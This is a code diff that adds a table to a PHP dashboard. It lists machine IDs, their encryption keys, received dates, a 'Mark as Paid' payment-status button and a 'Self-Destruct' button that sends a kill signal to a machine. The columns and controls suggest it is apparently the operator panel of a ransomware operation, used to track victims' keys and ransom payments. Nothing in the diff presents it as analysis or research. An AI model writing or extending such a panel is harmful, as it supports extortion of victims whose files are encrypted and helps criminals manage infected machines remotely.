@@ -191,6 +191,55 @@ $keys = $stmt->fetchAll(PDO::FETCH_ASSOC);
             </div>
             <!-- Sale & Revenue End -->
 
+            <!-- Step 14: Machine Keys Table -->
+            <div class="container-fluid pt-4 px-4">
+                <div class="bg-light-black rounded p-4">
+                    <a href="?action=export" class="btn btn-success mb-3">Export to CSV</a>
+                    <div class="table-responsive">
+                        <table class="table text-start align-middle table-bordered table-hover mb-0 text-white">
+                            <thead>
+                            <tr>
+                                <th>S.N</th>
+                                <th>Machine ID</th>
+                                <th>Encryption Key</th>
+                                <th>Received Date</th>
+                                <th>Status</th>
+                                <th>Actions</th>
+                            </tr>
+                            </thead>
+                            <tbody>
+                            <?php foreach ($keys as $index => $key): ?>
+                                <tr>
+                                    <td><?= $index + 1; ?></td>
+                                    <td><?= htmlspecialchars($key['machine_id']); ?></td>
+                                    <td><?= htmlspecialchars(substr($key['encryption_key'], 0, 50)) . '...'; ?></td>
+                                    <td><?= htmlspecialchars($key['received_date']); ?></td>
+                                    <td>
+                                        <?php if ($key['status'] !== 'paid'): ?>
+                                            <form method="POST" action="">
+                                                <input type="hidden" name="machineId" value="<?= $key['key_id']; ?>">
+                                                <button type="submit" name="markPaid" class="btn btn-success btn-sm">Mark as Paid</button>
+                                            </form>
+                                        <?php else: ?>
+                                            Paid
+                                        <?php endif; ?>
+                                    </td>
+                                    <td>
+                                        <button class="btn btn-danger btn-sm" onclick="sendKillSignal('<?= $key['machine_id']; ?>')">Self-Destruct</button>
+                                    </td>
+                                </tr>
+                            <?php endforeach; ?>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div> <!-- Container Fluid End -->
+    </div> <!-- Page Content End -->
+    </div> <!-- Wrapper End -->
+
+
+
 
 
 
